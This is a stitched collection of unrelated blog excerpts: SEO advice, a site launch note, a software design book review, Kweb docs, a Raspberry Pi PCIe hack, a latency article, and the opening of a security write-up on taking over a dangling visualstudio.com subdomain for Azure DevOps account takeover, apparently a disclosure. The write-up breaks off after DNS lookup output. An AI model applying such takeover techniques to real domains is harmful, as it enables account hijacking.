<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>

Posted 24. June 2020.
<strong>1 min read.</strong></p></div><div><div><div><p>Yesterday, I published my new website which has been created with <a href="https://gridsome.org/" title="Gridsome" target="_blank" rel="nofollow noopener noreferrer">Gridsome</a>. I had to reformat my blog posts and add tags to each of them. I have 156 posts, so this was not an easy task, to say the least.</p>
<p>Now I'm writing my first blog post using Forestry, and with any luck, it will post to my repository and deploy to my site with no issues. That's if I've set up the formatting correctly and everything else that comes with it.</p>
<p>I now have a newsletter which you can subscribe to using the form at the bottom of this post. Signing up is easy and it will make sure you never miss an update. However, if you're more of an RSS person, then I have that too.</p>
<p>There are a few more things I would like to add to my website such as comments that aren't by Disqus, social card metadata and an auto-generated sitemap. I should probably create a roadmap on my <a href="https://github.com/Michael-Brooks/michaelbrooks.co.uk" title="GitHub repository" target="_blank" rel="nofollow noopener noreferrer">GH repository</a> for you to keep an eye on.</p>
<p>That's pretty much it for this one, and if you like the new update please let me know on my <a href="https://twitter.com/MBrooksUK" target="_blank" rel="nofollow noopener noreferrer">Twitter page</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>This review is largely in response to the article "<a href="https://qntm.org/clean">It's probably time to stop recommending Clean Code</a>", and the ensuing <a href="https://www.reddit.com/r/programming/comments/hhlvqq/its_probably_time_to_stop_recommending_clean_code/">Reddit discussion</a>.  A lot of really interesting points were brought up, but the big question that the author themself wasn't able to answer was: "What should we recommend instead?"</p>
<p>I believe the book we should be recommending is <em>A Philosophy of Software Design</em> by John Ousterhout.  In this post I want to spend a bit of time reviewing it and giving an overview of the contents, and then I want to explain why, in my opinion, it is such a good recommendation.</p>
<h2>An Empirical Philosophy Book</h2>
<p>The elevator pitch of John Ousterhout's book <em>A Philosophy of Software Design</em> is fairly simple: he is a university professor by profession (albeit one with almost two decades of experience in the "real world"), who each year teaches students how to actually design software in a practical, hands-on course where the students are expected to design and modify "a substantial piece of software" in an iterative way, hopefully understanding more about the practice of software design each time around.</p>
<p>The book, then, is a synthesis of the pieces of wisdom that Ousterhout has himself learned from his own experiences, tempered and refined by the practical examples he has been able to draw from his students.  In this way, it has a (somewhat) scientific, research-based approach, where the author's assertions are backed up with examples from student projects that worked (or didn't).</p>
<p>At it's core, though, this is still philosophy - the book doesn't just list the things that worked well, and the things that worked poorly.  Instead, Ousterhout attempts in each chapter to divine broader truths that apply to software design in general.  There are no lists of what to do and what not to do, but instead principles to follow, red flags to be aware of, and warnings against taking anything too far.</p>
<h2>Structure</h2>
<p>The book is split into a series of chapters, each of which generally explores a single principle.  These range from the very high level ("Working Code Isn't Enough", "Modules Should Be Deep") to the more practical questions ("Choosing Names").  The whole book is relatively short (about 180 pages), and many chapters flow together nicely, which means that it's quite easy to go from cover-to-cover, rather than approach the book as a reference manual.  That said, the final pages provide summaries of the design principles and red flags found in the book, making it easy to reference key parts of the book.</p>
<p>Within each chapter, Ousterhout generally starts by stating a problem or motivation that software engineers will face, and then defining a principle to solve this.  The rest of the chapter is then a discussion of the principle, the dangers of alternative approaches, the red flags that indicate that the principle needs to be applied (or in some cases avoided), and some notes about taking ideas too far.</p>
<p>The examples are often based on problems that Ousterhout has given his classes, which means that they generally feel meaty enough to be worth discussing.  An example of a text editor appears in Chapter 6, but is extended in Chapters 7, 8, 9, and 10 in different contexts.  Enough is omitted from most examples to make the point clear, but enough is kept in to give the feeling of real code.</p>
<h2>Ousterhout's Principles</h2>
<p>The overriding theme throughout the book is that good code <em>looks</em> good.  Ousterhout thinks very much in terms of abstraction and interfaces - where "interfaces" refers to the contact points between different units of abstraction, rather than any similarly-named construct in any particular language.  Most of the book is dedicated to figuring out how to spot bad abstractions and rework them into good abstractions.</p>
<p>To a certain extent, this feels at odds with certain common mantras in software engineering circles today, where we encourage enough other to Keep It Simple, Stupid, and worry about premature abstractions.  <em>Philosophy</em> seems to worry less about the dangers of over-abstraction, and more concerned with how to make sure that the chosen abstraction is a good one.</p>
<p>This approach makes for a more positive experience than in many other programming circles - rather than being warned into a very conservative approach, Ousterhout encourages his readers to go out and make abstractions, but to be careful about designing the correct ones.</p>
<p>This isn't to say that the book isn't also cautionary - in the summary pages at the back, the list of red flags gets more page space than the list of principles, and throughout the book these red flags mark out moments when readers are given the go ahead to use these abstraction techniques.  There are also warnings about when a principle might be used too much.</p>
<h2>Everyone's a Critic</h2>
<p>Beyond the mild danger of encouraging excess abstraction, the biggest issue in <em>Philosophy</em> is probably the missing parts - the topic of testing gets a single page in Chapter 19 (Software Trends), and ideas about effective use of a type system to avoid issues are largely ignored.  Ousterhout's principles will still apply in these areas, but it would be nice to see some more specific discussion of these areas.</p>
<h2>The Target Audience</h2>
<p>It can be a bit unclear at times to whom Ousterhout writes.  A lot of the examples clearly relate to his students, and the projects that they come from have a somewhat academic feel - a text editor here, and an HTTP protocol parser there.  The code in the examples is generally object-oriented (Java and occasional C++), although it generally feels like it could be replaced with most imperative/OO languages without much of an effect.</p>
<p>The use of the phrase "software design" might make one think more of broader software architecture, but Ousterhout uses it more to describe the design of individual modules and functions <em>within</em> a program, rather than the broader architecture of the program itself (although he occasionally touches on that).</p>
<p>More functionally-minded people might think they can simply side-step a lot of the discussion here, in the same way that they can when discussing the Gang of Four's design patterns, but the principle "design errors out of existence" (Chapter 10) and its corollary "design special cases out of existence" should ring bells for people in this area who are also aware of the principle of making illegal states unrepresentable.</p>
<p>Ultimately, I think this book aims at a space that is slightly deeper than a lot of existing software literature.  Where books like <em>Design Patterns</em>, Fowler's <em>Refactoring</em>, and the aforementioned <em>Clean Code</em> are aimed at more traditional "enterprise" software development, <em>Philosophy</em> feels more widely applicable, albeit at the cost of being more abstract and difficult to apply.</p>
<p>In general, I think <em>Philosophy</em> is a good read if you are both (a) working with software regularly, and (b) conscious of the inherent maintenance cost in software, and aiming to minimise it.</p>
<h2>A Book to Recommend</h2>
<p>The original question I wanted to answer was what we, as software engineers, should recommend over books like <em>Clean Code</em>.  As I said, my answer to that question is <em>A Philosophy of Software Design</em>.</p>
<p>Software engineering (indeed, engineering in general) is not a science, insofar as there are no (or at least very few) exact answers.  Everything from the database you use to your choice of testing strategy will be dependent on the context of the software you're writing.  This means that the advice that we give to each other will probably be very context-specific.  In general, you probably shouldn't use a NoSQL database, but in a lot of specific contexts you probably should.</p>
<p>This isn't a problem if we don't run into these exceptional cases often, but engineering is all about exceptional cases - if there were no exceptional cases, we wouldn't need to write any new software, because our existing tools would do the job.  This is where books like <em>Philosophy</em> come in - rather than give situational advice, it attempts to define wider principles that the reader will then need to apply to different situations.</p>
<p>Take, for example, my favourite principle: "Modules should be deep" (explored in Chapter 4).  The idea is that an individual unit of abstraction should do a lot of work (i.e. be deep, and contain a lot of complexity), but it should have a relatively simple interface (i.e. be narrow).  Essentially, if you're going to abstract something, make sure your abstraction is deep.</p>
<p>Notice that this principle says nothing about functions, classes, lines, blocks, parameters, or anything specific to a single language or paradigm.  However, when we apply it, for example to the Java code Robert C. Martin talks about in <em>Clean Code</em>, we can derive some of his ideas from this principle.  Assuming a function is our unit of abstraction (for now, at least), the parameters are its interface, therefore we should reduce the number of parameters to the minimum necessary.</p>
<p>However, because our principle is more general, we can actually correct some of the mistakes Martin makes.  Martin talks about removing parameters by adding private fields to the class that the method belongs to.  When we think in terms of interfaces, we notice that this <em>hasn't decreased the interface at all</em> - we've lost a parameter, but we've gained a private field, and in the process made things harder for the consumer of our abstraction.</p>
<h2>Teaching Principles Over Rules</h2>
<p>When I recommend books, I generally hope that the other person will learn something from the book I have suggested.  If I were to recommend <em>Clean Code</em>, I would hope that the reader would learn something about how to write clean Java code, but I suspect they would mainly learn how to write code like Robert C. Martin - or more accurately, like someone copying Robert C. Martin's actions without always understanding why he's taking them.</p>
<p>I do not feel this way about <em>A Philosophy of Software Design</em>.  When I recommend it, I expect that the reader will not just learn something about Java, …</p></div></div></div>

<h2>Motivation<a href="#motivation" title="Permalink to this headline">¶</a></h2>
<p>Modern websites consist of at least two <a href="https://en.wikipedia.org/wiki/Coupling_(computer_programming)">tightly coupled</a> components, one runs in the browser, the other on the server.  These are often written in different programming languages and must communicate with each other over an HTTP connection.</p>
<p>Kweb’s goal is to eliminate this server/browser separation so that your webapp’s architecture is determined by the problem you’re solving, rather than the limitations of today’s tools.</p>
</div>
<div id="how-does-it-work">
<h2>How does it work?<a href="#how-does-it-work" title="Permalink to this headline">¶</a></h2>
<p>Kweb is a self-contained Kotlin library that can be added easily to new or existing projects.  When Kweb receives
a HTTP request it responds with the initial HTML page, and some JavaScript that connects back to the web server via a WebSocket.  The page then waits and listens for instructions from the server, while notifying the server of relevant browser events.</p>
<p>A common concern about this approach is that the user interface might feel sluggish if it is server driven. Kweb solves this problem by <a href="https://docs.kweb.io/en/latest/events.html#immediate-events">preloading</a> instructions to
the browser to be executed immediately on browser events without a server round-trip.</p>
<p>We’ve designed Kweb to be efficient in both the browser and server, and makes effective use of Kotlin’s concurrency features, particularly <a href="https://kotlinlang.org/docs/reference/coroutines-overview.html">coroutines</a>.</p>

That could be a bit of a problem if you ever mess up the networking and need to attach a keyboard.</s> Never mind, it seems that the USB-C power connector <a rel="noreferrer noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=29&amp;t=246348&amp;p=1678554" target="_blank">can run as a USB host</a>, allowing a keyboard to be connected if 5V power is supplied through the GPIO header instead.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg" alt="" width="848" height="375" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-300x133.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-768x341.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1536x681.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg 1761w" sizes="(max-width: 848px) 100vw, 848px"></a></figure></div> <p>The bridge “chip” is a 0.8mm thick PCB from OSHPark with copper pads in the same locations as a real VL805 QFN68 IC package, then traces connecting the PCIe pads to the USB pads that connect to the upper USB 3.0 port. RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p> <figure><table><thead><tr><th>PCIe Signal</th><th>Direction</th><th>USB Signal</th></tr></thead><tbody><tr><td>REFCLK+</td><td>Host -&gt; Device</td><td>D-</td></tr><tr><td>REFCLK-</td><td>Host -&gt; Device</td><td>D+</td></tr><tr><td>HSO+</td><td>Host (TX) -&gt; Device (RX)</td><td>RX-</td></tr><tr><td>HSO-</td><td>Host (TX) -&gt; Device (RX)</td><td>RX+</td></tr><tr><td>HSI+</td><td>Device (TX) -&gt; Host (RX)</td><td>TX-</td></tr><tr><td>HSI-</td><td>Device (TX) -&gt; Host (RX)</td><td>TX+</td></tr><tr><td>RESET</td><td>Host -&gt; Device</td><td>D- (lower port)</td></tr><tr><td>WAKE (not connected anywhere)</td><td>Device -&gt; Host</td><td>D+ (lower port)</td></tr><tr><td>CLKREQ</td><td>Host -&gt; Device</td><td>RX+ (lower port)</td></tr><tr><td>PONRST</td><td>Not a PCIe signal, connected like a reset pin on a microcontroller.</td><td>RX- (lower port)</td></tr></tbody></table><figcaption>HSI and HSO (in and out) are from the perspective of the host controller.

The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg 1760w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <center></center> <p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p> <div><figure><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png 628w, https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4-300x30.png 300w" sizes="(max-width: 628px) 100vw, 628px"></figure></div> <p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post.

The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p> <p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p> <p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p> <p><a rel="noreferrer noopener" href="https://docs.turris.cz/hw/mox/Turris_Mox_F.pdf" target="_blank">This pdf</a> has a full schematic using a VL805 on pages 7 and 8 (pictured below), very handy since any information about the chip is scarce.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8.png" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8-150x150.png" alt=""></a></figure></div> <p>These “chips” are available to buy from my <a href="https://www.tindie.com/products/20478/" target="_blank" rel="noreferrer noopener">Tindie store</a>!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>As a software developer you might be familiar with <a href="http://norvig.com/21-days.html#answers" target="_blank" rel="nofollow noopener noreferrer">the following table</a><a name="latency-table"></a>:
<img src="https://yenkel.dev/media/2020-06-27/latency.png"></p><p>Even if the times are not exact and up to date for 2020, the gist of it is clear. Some operations (disk, network) are more expensive than others. When looking to minimize latency, start from operations that are more likely to take longer, because they are naturally slower due to hardware and speed of light limitations.</p><p>The importance of latency will depend on the software you are writing. For some software latency can business critical:</p><ul><li><a href="https://en.wikipedia.org/wiki/Real-time_computing" target="_blank" rel="nofollow noopener noreferrer">Real-time computing</a> where operations must guarantee completion under a deadline.</li><li>A SaaS with latency SLAs that you need to meet for your enterprise customers </li><li>e-commerce that loses money when the site is slow (see this great blog post about <a href="http://blog.tacertain.com/p-four-nines/" target="_blank" rel="nofollow noopener noreferrer">Amazon</a>).</li></ul><p>You might also be writing software that you want to be “fast enough” or “not unnecessarily slow”.</p><p>While getting to concrete latency guarantees for critical cases requires a lot of work and investment, it is also true that latency is one of those things that is easy to overlook unless you are paying attention. Over time, small decisions can pile up and you can end up with a product that is a lot slower than it should be mostly because of <a href="http://faculty.salisbury.edu/~xswang/Research/Papers/SERelated/no-silver-bullet.pdf" target="_blank" rel="nofollow noopener noreferrer">accidental complexity, not essential complexity</a>. </p><p>The “broken windows” theory presents the problem in a nice way (From <a href="https://en.wikipedia.org/wiki/Broken_windows_theory" target="_blank" rel="nofollow noopener noreferrer">wikipedia</a>): <em>The broken windows theory is a criminological theory that states that visible signs of crime, anti-social behavior, and civil disorder create an urban environment that encourages further crime and disorder, including serious crimes. The theory suggests that policing methods that target minor crimes such as vandalism, loitering, public drinking, jaywalking and fare evasion help to create an atmosphere of order and lawfulness, thereby preventing more serious crimes.</em>
<img src="https://yenkel.dev/media/2020-06-27/broken-windows.jpg"></p><p>Whether the theory is correct or not (there is an interesting chapter on this in the book <a href="https://www.amazon.com/Freakonomics-Economist-Explores-Hidden-Everything/dp/0060731338" target="_blank" rel="nofollow noopener noreferrer">Freakonomics</a>) it is a useful context to talk about software. In the software industry, the Pragmatic Programmer book states <a href="https://www.artima.com/intv/fixit.html" target="_blank" rel="nofollow noopener noreferrer">“don’t live with broken windows”</a>.
If we apply this to latency it is easy to reason that if you let small decisions/changes increase latency, over time the latency of the system will continuously increase over time. At some point, going back and figuring things out will be overly complex and sometimes teams decide to go for complicated solutions to solve this problem. We want to avoid that.</p><p>One of the things we do at <a href="http://auth0.com/" target="_blank" rel="nofollow noopener noreferrer">Auth0</a> is iterative delivery. Initial versions of code work and are tested, etc., but until we validate features with customers we avoid investing in optimizations. </p><p>However, some things can be done in an initial implementation so we don’t need to optimize later, as that’s when as a developer you have the context about what you are doing. Re-thinking many small decisions a few weeks down the road is less than ideal. In this context, thinking about “expensive operations” latency wise is useful.</p><p>As part of a project, we are working on developing a new service (<code>new-service</code>) and adding some calls to it from an existing service (<code>client</code>). As we reviewed the changes we made to the <code>client</code> with the team, we found several opportunities for improvement.</p><p>The code snippets below are examples written using Javascript, but these ideas are language agnostic.</p><h2 id="parallel-io"><a href="#parallel-io" aria-label="parallel io permalink"></a>Parallel I/O</h2><blockquote><p>When I/O ops do not depend on each other and you need all data if possible use parallel queries.</p></blockquote><p>Let’s say a change to client code looked like this:</p><div data-language="js"><pre><code>     <span>const</span> a <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    </code></pre></div><p>The <code>getDataFromNewService(...)</code> call performs network I/O. Because we are working on this <code>new-service</code>, we know it also does more network I/O to talk to a database (which might need to do some disk I/O). All of these operations are naturally in the slow end of the spectrum from the <a href="#latency-table">table at the beginning of this blog post</a>.</p><p>If we can’t avoid the operations, performing these in parallel yields some clear benefits. If the resulting code looks like this:</p><div data-language="js"><pre><code><span>const</span> <span>[</span>a<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>,</span> 
    <span>callNewService</span><span>(</span><span>...</span><span>)</span>
<span>]</span><span>)</span><span>;</span></code></pre></div><p>If we call the time for these operations <code>t1</code> (<code>existing-service</code>) and <code>t2</code> (<code>new-service</code>), in the last example we change the latency from <code>sum(t1, t2)</code> to <code>max(t1, t2)</code>. That even means that if we don’t want to make latency higher than the original, all we need to do is ensure <code>t2 &lt;= t1</code>!</p><h2 id="pre-fetching"><a href="#pre-fetching" aria-label="pre fetching permalink"></a>Pre-fetching</h2><blockquote><p>When I/O operations op2 only runs if op1 is likely to be successful, if op1 is likely to be successful in most cases, consider doing op2 in parallel (<a href="https://en.wikipedia.org/wiki/Prefetching" target="_blank" rel="nofollow noopener noreferrer">pre-fetching</a>).</p></blockquote><p>This case is similar to the previous one, but might be easier to miss. Let’s say the code after the change looks like this:</p><div data-language="js"><pre><code>    <span>const</span> param <span>=</span> <span>...</span>
    <span>const</span> exists <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span>param<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
        
    <span>}</span>
<span>+</span>   <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span>param<span>)</span><span>;</span>
<span>+</span>   </code></pre></div><p>Both function calls depend on <code>param</code>, which is available before calling <code>callExistingService(param)</code>. If the likelihood of <code>exists</code> being false is low, then calling <code>callNewService(param)</code> in parallel is likely worth it. You won’t be adding a lot more load to <code>new-service</code> in case <code>exists === false</code>, but you will be getting the aforementioned benefits for parallel I/O.</p><p>The latency improved code would look like this:</p><div data-language="js"><pre><code><span>const</span> param <span>=</span> <span>...</span>
<span>const</span> <span>[</span>exists<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
  <span>callExistingService</span><span>(</span>param<span>)</span><span>,</span> 
  <span>callNewService</span><span>(</span>param<span>)</span><span>]</span><span>)</span><span>;</span>

<span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
    
<span>}</span>
</code></pre></div><h2 id="no-op"><a href="#no-op" aria-label="no op permalink"></a>No-op</h2><blockquote><p>When you can replace an I/O operation for a no-op, do it.</p></blockquote><p>The best performance/latency optimization is a “no-op”, i.e. figuring out how to prevent the call from happening. A simple way of doing this is caching. However, it is important to consider that caching does not need to be overly complicated and require every developer’s favorite hammer <a href="https://redis.io/" target="_blank" rel="nofollow noopener noreferrer">Redis</a>. It just means <em>to store the value of computation to prevent performing the computation again</em>. </p><p>The code we reviewed was doing this:</p><div data-language="js"><pre><code>    
    <span>const</span> context <span>=</span> <span>await</span> <span>hydrateContext</span><span>(</span><span>)</span><span>;</span>
    <span>...</span>
    
<span>+</span>   <span>const</span> result <span>=</span> <span>callNewService</span><span>(</span>context<span>.</span>param<span>)</span><span>;</span></code></pre></div><p>In this situation, the <code>client</code> had a way to store the result of a previous call to <code>new-service</code> that returned the same value. If <code>result</code> is relatively small and does not change it can be stored with the context and loaded as part of <code>hydrateContext()</code>. That way, the call we can simply avoid <code>callNewService(context.param);</code>.</p><p>The fastest call is the call that never happens 😆</p><p>When you are working on code, don’t <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">optimize prematurely</a>. I recommend, however, you add a “mental checklist” item to focus on latency and cross it off before submitting a PR. That will help you find <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">Donald Knuth’s 3%</a>.</p><p>It is likely that just doing that and focusing on that latency for 10 minutes might point to small but valuable improvements that you can make, and accumulating latency over time.</p><p>Don’t live with latency broken windows!</p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
